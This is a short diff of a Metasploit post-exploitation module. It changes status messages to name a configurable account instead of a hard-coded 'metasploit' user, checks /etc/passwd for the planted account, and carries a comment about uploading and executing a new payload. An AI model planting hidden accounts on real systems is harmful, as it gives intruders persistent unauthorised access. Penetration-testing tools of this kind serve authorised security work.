@@ -94,9 +94,9 @@ class Metasploit3 < Msf::Post
 
 		if cmd_exec("(grep Metasploit /etc/passwd > /dev/null && echo true) || echo false").include?("true") 
 		then
-			print_good("Success. You should now be able to login or su to the 'metasploit' user with password 'metasploit'.")
+			print_good("Success. You should now be able to login or su to the '" + datastore['USERNAME'] + "' account")
 		else
-			print_error("Failed. You should manually verify the 'metasploit' user has not been added")	
+			print_error("Failed. You should manually verify the '" + datastore['USERNAME'] + "' user has not been added")	
 		end 
 		# 0a2940: Initially the plan was to have this post module switch user, upload & execute a new payload
 		#	  However beceause the session is not a terminal, su will not always allow this.		
